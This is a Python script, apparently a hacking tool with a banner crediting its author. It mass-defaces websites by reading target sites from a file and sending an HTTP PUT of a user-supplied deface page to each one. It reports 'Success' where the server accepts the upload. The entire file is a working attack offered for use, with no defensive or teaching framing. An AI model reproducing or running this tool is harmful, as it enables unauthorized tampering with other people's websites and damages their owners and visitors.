#-*- coding: utf-8 -*-
try:
   import requests
   import os.path
   import sys
   import time
except ImportError:
   exit("install requests and try again ...")

os.system('clear')
banner = """
\033[00mHi... Let's start doing.\033[1;30m
\t                     ____  ____  ____      
\t   ____  ____  ___  / __ \/ __ \/ __ \_  __
\t  / __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / |/_/
\t / / / / /_/ /  __/\__, /\__, /\__, />  <  
\t/_/ /_/\____/\___//____//____//____/_/|_|  
\t \033[1;31m• \033[1;30mFacebook.com/noe999x
\t \033[1;31m• \033[1;30mGithub.com/noe999x
\t \033[1;31m• \033[1;30mYoutube.com/c/Anonim404\033[1;30m
"""

g = '\033[1;30m'
b = '\033[1;31m'
h = '\033[1;32m'
m = '\033[00m'
n = '\033[1;36m'

def menu(__bn__):
    print(__bn__)
    print(n+"1"+g+" Start executing target")
    print(n+"2"+g+" Create new target file")
    print(n+"3"+g+" Edit target file")
    print(n+"4"+g+" Input your script deface")
    nancy = input (" \nChoice :\033[00m ")
    if nancy in (""," "):
             print(b+"Wrong choice");time.sleep(5)
             menu()
    elif nancy in ("01","1"):
                os.system("clear")
                main(__bn__)
    elif nancy in ("02","2"):
                with open('target.txt', 'w') as f:
                    f.write('Create a new text file!')
                    os.system("clear")
                    print(h+"File "+n+"target.txt "+h+"has been crated!")
                    menu(__bn__)
    elif nancy in ("03","3"):
                os.system("clear")
                print(h+"Save file if u finish edit file "+n+"CTRL+S > CTRL+X");time.sleep(3)
                os.system('nano target.txt')
                os.system("clear")
                print(h+"File "+n+"target.txt "+h+"has been edited!")
                menu(__bn__)
    elif nancy in ("04","4"):
                os.system('clear')
                print(h+"Copy & Paste your script deface into the file in your\nchoice here.");time.sleep(1)
                print(h+"Save file if u finish edit file "+n+"CTRL+S > CTRL+X");time.sleep(3)
                exc(__bn__)
    else :
             os.system("clear")
             print(b+"Wrong choice!")
             menu(__bn__)
        
def exc(__bn__):
    print(__bn__)
    print(n+"   1"+g+"   index.html")
    print(n+"   2"+g+"   index.htm")
    print(n+"   3"+g+"   index.asp")
    print(n+"   4"+g+"   default.html")
    print(n+"   5"+g+"   default.htm")
    print(n+"   6"+g+"   default.asp")
    print(n+"   7"+g+"   home.html")
    print(n+"   8"+g+"   home.htm")
    print(n+"   9"+g+"   home.asp")
    print(n+"   10"+g+"  noe.html")
    print(n+"   99"+g+"  Back to main menu")
    papmek = input ("\nChoice : ")
    if papmek in (""," "):
               print(b+"Wrong choice!");time.sleep(5)
               exc(__bn__)
    elif papmek in ("01","1"):
                 os.system("rm -rf index.html && nano index.html")
                 os.system("clear")
                 print(h+"File "+n+"index.html "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("02","2"):
                 os.system("rm -rf index.htm && nano index.htm")
                 os.system("clear")
                 print(h+"File "+n+"index.htm "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("03","3"):
                 os.system("rm -rf index.asp && nano index.asp")
                 os.system("clear")
                 print(h+"File "+n+"index.asp "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("04","4"):
                 os.system("rm -rf default.html && nano default.html")
                 os.system("clear")
                 print(h+"File "+n+"default.html "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("05","5"):
                 os.system("rm -rf default.htm && nano default.htm")
                 os.system("clear")
                 print(h+"File "+n+"default.htm "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("06","6"):
                 os.system("rm -rf default.asp && nano default.asp")
                 os.system("clear")
                 print(h+"File "+n+"default.asp "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("07","7"):
                 os.system("rm -rf home.html && nano home.html")
                 os.system("clear")
                 print(h+"File "+n+"home.html "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("08","8"):
                 os.system("rm -rf home.htm && nano home.htm")
                 os.system("clear")
                 print(h+"File "+n+"home.htm "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("09","9"):
                 os.system("rm -rf home.asp && nano home.asp")
                 os.system("clear")
                 print(h+"File "+n+"home.asp "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("10"):
                 os.system("rm -rf noe.html && nano noe.html")
                 os.system("clear")
                 print(h+"File "+n+"noe.html "+h+"has been edited!")
                 exc(__bn__)
    elif papmek in ("99"):
                 os.system("clear")
                 menu(__bn__)
    else :
               os.system("clear")
               print(b+"Wrong choice!")
               exc(__bn__)

def x(memekganyu):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(memekganyu)
   else:
      ipt = raw_input(memekganyu)
   
   return str(ipt)

def susuganyu(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print(h+"•"+g+" Executing "+h+"%d\033[1;30m website, please wait.\n"%(len(target)))
      time.sleep(3)
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(n+"•"+b+" Not vuln"+g+" ~> %s/%s"%(site,script))
            else:
               print(n+"•"+h+" Success "+g+" ~> %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x(m+"• "+g+"Enter the name of your deface script file :"+h+" ")
         if not os.path.isfile(a):
            print(b+"• "+g+"file "+b+"'%s' \033[1;30mnot found, try again.\n"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   susuganyu(a)

if __name__ == "__main__":
    menu(banner)
